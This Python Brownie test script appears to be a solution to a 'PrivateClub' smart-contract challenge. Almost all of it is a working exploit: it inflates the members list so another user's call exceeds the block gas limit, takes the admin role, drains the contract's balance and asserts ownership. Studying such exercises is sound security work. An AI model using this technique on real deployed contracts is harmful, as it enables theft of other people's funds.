#!/usr/bin/python3
from brownie import PrivateClub, web3, Attack
from colorama import Fore
from scripts.deploy import deploy


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

blockGasLimit = 120000


def test_be_member_contract():
    private_club, ownerFriend, user2, user3, user4, attacker = deploy()
    _members = [attacker.address] * private_club.membersCount()
    old_owner = private_club.owner()
    amount = private_club.membersCount()

    tx = private_club.becomeMember(_members, {"from": attacker, "value": f"{amount} ether"})
    tx.wait(1)

    # task1: become member of the club and
    # print(private_club.members(attacker, {"from": attacker}))
    assert private_club.members(attacker, {"from": attacker}) == True

    _members = [attacker.address] * private_club.membersCount()
    amount = private_club.membersCount()
    tx = private_club.becomeMember(_members, {"from": attacker, "value": f"{amount} ether"})
    tx.wait(1)

    
    _members.append(attacker.address)
    amount = private_club.membersCount()

    private_club.becomeMember(
        _members, {"from": user4, "value": f"{amount} ether"}
    ).wait(1)

    
    print(f"{green}Gas used by user4: {blue}{web3.eth.getBlock('latest').gasUsed}")
    print(f"{green}Gas limit is:      {blue}{blockGasLimit}{reset}")

    assert web3.eth.getBlock("latest").gasUsed > blockGasLimit

    # withdraw the money from our contract
    # print(web3.fromWei(attacker.balance(), "ether"))

    private_club.buyAdminRole(
        attacker.address, {"from": attacker, "value": f"10 ether"}
    )

    private_club.adminWithdraw(
        attacker.address, private_club.balance(), {"from": attacker}
    )
    #print(private_club.balance())

    print(f"{blue}Old owner: {green}{old_owner}")
    print(f"{blue}New owner: {red}{private_club.owner()}{reset}")
    print(f"{blue}Attacker : {red}{attacker.address}")
    print(
        f"{blue}Attacker balance: {red}{web3.fromWei(attacker.balance(), 'ether')} ETH"
    )
    #print(attacker.balance())

    assert private_club.owner() == attacker.address
    assert attacker.balance() > 110000000000000000000 - 1


def main():
    test_be_member_contract()
